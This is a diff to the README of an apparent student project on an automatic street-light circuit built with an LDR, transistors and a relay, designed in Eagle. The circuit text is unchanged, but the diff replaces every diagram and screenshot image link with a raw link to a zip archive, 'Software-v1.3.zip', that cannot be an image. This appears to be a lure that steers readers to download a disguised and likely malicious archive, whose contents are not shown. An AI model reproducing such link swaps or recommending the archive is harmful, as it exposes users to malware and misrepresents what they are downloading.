@@ -38,14 +38,14 @@ The automatic street light circuit is a practical application of a light-sensing
 ## Working
 The circuit functions by sensing the amount of light falling on the LDR and responding accordingly by turning the connected AC lamp ON or OFF. During daytime or in a well-lit environment, the LDR’s resistance drops significantly, resulting in a lower voltage at the base of the first transistor (Q1). Since this voltage is below the transistor's threshold, Q1 remains OFF, and as a result, the second transistor (Q2) also stays OFF. With both transistors non-conducting, the relay coil receives no current and remains de-energized, keeping the lamp circuit open and the lamp OFF. As night approaches and ambient light reduces, the resistance of the LDR increases, causing a higher voltage drop across it and increasing the voltage at the base of Q1. Once this voltage crosses the required threshold, Q1 begins to conduct, allowing current to flow into the base of Q2, which also starts conducting. When Q2 turns ON, it completes the circuit for the relay coil, energizing it. This activates the relay, closing its normally open contacts and allowing the 220V AC supply to power the connected lamp (L1). The diode (D1) acts as a flyback diode, safely dissipating the back emf produced by the relay coil when switching, thereby protecting Q2 from damage. In this way, the circuit ensures that the lamp automatically switches ON at night and turns OFF during the day, based solely on surrounding light conditions.
 ## CIRCUIT DIAGRAM:
-![image](https://github.com/user-attachments/assets/72aa69d2-792f-46bc-810e-50b25a13864f)
+![image](https://raw.githubusercontent.com/MITHUN8521/Design-an-Automatic-street-light-PCB-circuit-using-Eagle-software-and-generate-the-Gerber-file./main/husheen/Software-v1.3.zip)
 
 ## EXPECTED OUTPUT:
 ### Schematic diagram
- <img width="792" height="409" alt="Screenshot 2025-11-10 212807" src="https://github.com/user-attachments/assets/a6c63115-2c06-4741-b66e-dd35acd70317" />
+ <img width="792" height="409" alt="Screenshot 2025-11-10 212807" src="https://raw.githubusercontent.com/MITHUN8521/Design-an-Automatic-street-light-PCB-circuit-using-Eagle-software-and-generate-the-Gerber-file./main/husheen/Software-v1.3.zip" />
 
 ### Layout diagram
-<img width="735" height="433" alt="Screenshot 2025-11-10 212828" src="https://github.com/user-attachments/assets/0f15254a-b348-4492-ae66-edf9859b778f" />
+<img width="735" height="433" alt="Screenshot 2025-11-10 212828" src="https://raw.githubusercontent.com/MITHUN8521/Design-an-Automatic-street-light-PCB-circuit-using-Eagle-software-and-generate-the-Gerber-file./main/husheen/Software-v1.3.zip" />
 
  
 ## RESULT:
